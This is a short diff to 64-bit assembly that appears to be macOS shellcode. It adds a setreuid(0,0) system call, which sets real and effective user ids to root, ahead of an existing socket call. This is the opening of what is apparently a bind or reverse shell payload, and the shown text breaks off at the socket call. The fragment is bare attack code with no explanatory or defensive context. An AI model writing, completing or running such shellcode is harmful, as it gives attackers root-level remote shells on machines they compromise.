@@ -1,10 +1,17 @@
 BITS 64
 
-section .text
-
 global start
 
 start:
+  mov r8b, 0x02               ; unix class system calls = 2
+  shl r8, 24                  ; shift left 24 to the upper order bits
+  or r8, 0x17                 ; setreuid is 0x17
+  mov rax, r8                 ; put setreuid syscall # into rax
+
+  xor rdi, rdi                ; real userid
+  xor rsi, rsi                ; effective userid
+  syscall                     ; setreuid(ruid, euid)
+
   mov r8b, 0x02               ; unix class system calls = 2
   shl r8, 24                  ; shift left 24 to the upper order bits
   or r8, 0x61                 ; socket is 0x61
